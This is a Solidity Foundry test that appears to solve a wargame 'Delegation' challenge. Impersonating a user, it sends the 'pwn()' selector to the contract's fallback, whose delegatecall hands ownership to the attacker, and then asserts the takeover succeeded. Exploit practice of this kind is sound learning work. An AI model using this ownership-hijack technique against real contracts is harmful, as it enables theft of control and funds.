// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "../src/Delegation/Delegation.sol";
import "../src/Delegation/DelegationFactory.sol";
import "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

contract DelegationTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testDelegation() public {
        DelegationFactory factory = new DelegationFactory();
        address instance = factory.createInstance(msg.sender);
        Delegation delegation = Delegation(payable(instance));
        assertEq(delegation.owner(), address(factory));
        vm.prank(_alice, _alice); // msg.sender, tx.origin
        (bool _success, ) = address(delegation).call(
            abi.encode(bytes4(keccak256("pwn()")))
            //abi.encodeWithSignature("countUp()")
        );
        assertTrue(_success, "failed to send");
        assertEq(delegation.owner(), _alice);
        assertTrue(
            factory.validateInstance(payable(address(delegation)), _alice),
            "invalid"
        );
    }
}
